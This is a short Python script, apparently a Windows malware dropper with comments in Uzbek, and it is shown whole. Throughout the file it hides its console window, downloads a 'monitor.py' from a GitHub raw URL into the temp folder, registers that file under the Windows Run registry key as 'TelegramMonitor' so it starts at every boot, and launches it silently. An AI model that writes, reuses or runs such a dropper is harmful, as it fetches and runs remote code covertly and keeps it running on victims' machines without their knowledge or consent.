import sys, urllib.request, os, ctypes, subprocess, tempfile, winreg

if os.name == 'nt':
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# 1. Doimiy ishlaydigan monitor.py ni yuklab olamiz
monitor_url = "https://raw.githubusercontent.com/ishmuratovaziz1-afk/checker-bott/main/monitor.py"
monitor_path = os.path.join(tempfile.gettempdir(), "monitor.py")

try:
    content = urllib.request.urlopen(monitor_url).read().decode()
    with open(monitor_path, 'w') as f:
        f.write(content)
except:
    sys.exit()

# 2. Uni Registry (Startup) ga qo'shamiz (kompyuter yoqilganda ishga tushadi)
try:
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "TelegramMonitor", 0, winreg.REG_SZ, f'"{sys.executable}" "{monitor_path}"')
    winreg.CloseKey(key)
except:
    pass

# 3. Hozir ishga tushiramiz (bir marta)
subprocess.Popen([sys.executable, monitor_path], creationflags=subprocess.CREATE_NO_WINDOW)
